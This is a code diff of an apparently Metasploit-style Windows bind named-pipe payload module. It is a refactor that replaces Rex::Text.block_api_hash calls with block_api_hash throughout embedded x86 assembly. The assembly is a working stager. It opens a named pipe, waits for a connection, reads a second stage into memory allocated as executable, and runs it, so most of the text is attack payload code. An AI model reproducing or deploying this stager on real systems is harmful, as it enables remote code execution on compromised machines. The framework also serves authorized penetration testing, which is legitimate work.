@@ -118,7 +118,7 @@ module Payload::Windows::BindNamedPipe
         db #{raw_to_db(uuid_raw)}  ; lpBuffer
       get_uuid_address:
         push edi                   : hPipe
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'WriteFile')}
+        push #{block_api_hash('kernel32.dll', 'WriteFile')}
         call ebp                   ; WriteFile(hPipe, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten)
     ^
   end
@@ -154,7 +154,7 @@ module Payload::Windows::BindNamedPipe
         call get_pipe_name      ; lpName
         db "#{full_pipe_name}", 0x00
       get_pipe_name:
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'CreateNamedPipeA')}
+        push #{block_api_hash('kernel32.dll', 'CreateNamedPipeA')}
         call ebp                ; CreateNamedPipeA(lpName, dwOpenMode, dwPipeMode, nMaxInstances, nOutBufferSize,
                                 ;                  nInBufferSize, nDefaultTimeOut, lpSecurityAttributes)
         mov edi, eax            ; save hPipe (using sockedi convention)
@@ -171,11 +171,11 @@ module Payload::Windows::BindNamedPipe
       connect_pipe:
         push 0                  ; lpOverlapped
         push edi                ; hPipe
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'ConnectNamedPipe')}
+        push #{block_api_hash('kernel32.dll', 'ConnectNamedPipe')}
         call ebp                ; ConnectNamedPipe(hPipe, lpOverlapped)
 
       ; check for failure
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'GetLastError')}
+        push #{block_api_hash('kernel32.dll', 'GetLastError')}
         call ebp                ; GetLastError()
         cmp eax, 0x217          ; looking for ERROR_PIPE_CONNECTED
         jz get_stage_size       ; success
@@ -184,7 +184,7 @@ module Payload::Windows::BindNamedPipe
 
       ; wait before trying again
         push #{retry_wait}
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
+        push #{block_api_hash('kernel32.dll', 'Sleep')}
         call ebp                ; Sleep(millisecs)
         jmp connect_pipe
       ^
@@ -202,7 +202,7 @@ module Payload::Windows::BindNamedPipe
         push 0                  ; lpMaxCollectionCount
         push ecx                ; lpMode (PIPE_WAIT)
         push edi                ; hPipe
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'SetNamedPipeHandleState')}
+        push #{block_api_hash('kernel32.dll', 'SetNamedPipeHandleState')}
         call ebp                ; SetNamedPipeHandleState(hPipe, lpMode, lpMaxCollectionCount, lpCollectDataTimeout)
       ^
     end
@@ -217,7 +217,7 @@ module Payload::Windows::BindNamedPipe
         lea ecx, [esp+16]       ; lpBuffer
         push ecx
         push edi                ; hPipe
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
+        push #{block_api_hash('kernel32.dll', 'ReadFile')}
         call ebp                ; ReadFile(hPipe, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped)
         pop eax                 ; lpNumberOfBytesRead
         pop esi                 ; lpBuffer (stage size)
@@ -238,7 +238,7 @@ module Payload::Windows::BindNamedPipe
         push 0x1000             ; MEM_COMMIT
         push esi                ; dwLength
         push 0                  ; NULL as we dont care where the allocation is
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        push #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp                ; VirtualAlloc(NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
       ^
 
@@ -267,7 +267,7 @@ module Payload::Windows::BindNamedPipe
         push edx                ; nNumberOfBytesToRead
         push ebx                ; lpBuffer
         push edi                ; hPipe
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
+        push #{block_api_hash('kernel32.dll', 'ReadFile')}
         call ebp                ; ReadFile(hPipe, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped)
         pop edx                 ; lpNumberOfBytesRead
     ^
@@ -283,13 +283,13 @@ module Payload::Windows::BindNamedPipe
         push 0x8000             ; MEM_RELEASE
         push 0                  ; dwSize, 0 to decommit whole block
         push ecx                ; lpAddress
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
+        push #{block_api_hash('kernel32.dll', 'VirtualFree')}
         call ebp                ; VirtualFree(payload, 0, MEM_RELEASE)
 
       cleanup_file:
       ; cleanup the pipe handle
         push edi                ; file handle
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'CloseHandle')}
+        push #{block_api_hash('kernel32.dll', 'CloseHandle')}
         call ebp                ; CloseHandle(hPipe)
 
         jmp failure
@@ -319,14 +319,14 @@ module Payload::Windows::BindNamedPipe
         call get_kernel32_name
         db "kernel32", 0x00
       get_kernel32_name:
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'GetModuleHandleA')}
+        push #{block_api_hash('kernel32.dll', 'GetModuleHandleA')}
         call ebp                ; GetModuleHandleA("kernel32")
 
         call get_exit_name
         db "ExitThread", 0x00
       get_exit_name:            ; lpProcName
         push eax                ; hModule
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'GetProcAddress')}
+        push #{block_api_hash('kernel32.dll', 'GetProcAddress')}
         call ebp                ; GetProcAddress(hModule, "ExitThread")
         push 0                  ; dwExitCode
         call eax                ; ExitProcess(0)
